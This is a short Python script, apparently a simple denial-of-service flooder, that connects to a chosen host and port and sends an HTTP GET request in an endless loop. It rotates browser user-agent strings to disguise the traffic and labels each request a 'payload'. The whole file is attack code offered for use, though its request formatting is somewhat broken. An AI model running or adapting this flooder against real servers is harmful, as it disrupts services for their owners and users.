import socket
import random
user_agents=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15"]
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
def rain(host,port,file):
    user_agent=random.choice(user_agents)
    payload=f'''
GET {file} HTTP/1.1
Host: {host}
User-Agent: {user_agent}
    '''
    enc_payload=payload.encode()
    s.connect((host,port))
    while(True):
        s.send(enc_payload)
        print(f"payload sent to {host}:{port}")